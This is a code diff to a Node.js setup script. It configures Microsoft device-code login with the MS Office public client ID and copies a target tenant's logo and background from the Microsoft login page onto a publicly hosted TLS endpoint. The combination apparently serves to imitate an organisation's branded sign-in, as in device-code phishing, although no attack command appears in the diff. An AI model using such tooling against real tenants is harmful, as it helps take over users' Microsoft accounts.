@@ -10,7 +10,7 @@ import { fileURLToPath } from 'url';
 import { parseArgs } from 'util';
 import acme from 'acme-client';
 import { publicUrl } from './smoke-test.mjs';
-import { fetchTenantBranding } from './tenant-branding.mjs';
+import { fetchTenantBranding, tenantLoginPreviewUrl } from './tenant-branding.mjs';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const ROOT = __dirname;
@@ -156,7 +156,7 @@ Examples:
 Microsoft setup notes:
   - tokenUrl and deviceCodeUrl are fetched from /.well-known/openid-configuration.
   - clientId uses the standard MS Office public client (not in OpenID discovery).
-  - Branded tenant login page is shown when tenant-specific endpoints are used.
+  - Tenant logo/background are pulled from the Microsoft login page (?whr=<tenant>).
 
 TLS notes:
   - Let's Encrypt (default): token needs Zone → DNS → Edit. DNS record must be grey cloud
@@ -908,11 +908,12 @@ async function main() {
       console.log(`  tokenUrl: ${config.tokenUrl}`);
       console.log(`  deviceCodeUrl: ${config.deviceCodeUrl}`);
       console.log(`  clientId: ${config.clientId} (MS Office public client — override with --client-id)`);
+      console.log(`  tenant login preview: ${tenantLoginPreviewUrl(discovery.tenant)}`);
       try {
         config.tenantBranding = await fetchTenantBranding(
           discovery.tenant,
-          config.clientId,
-          config.userAgent
+          config.userAgent,
+          config.clientId
         );
         console.log(`  tenant logo: ${config.tenantBranding.bannerLogo || 'Microsoft default'}`);
         console.log(`  tenant background: ${config.tenantBranding.backgroundColor}`);
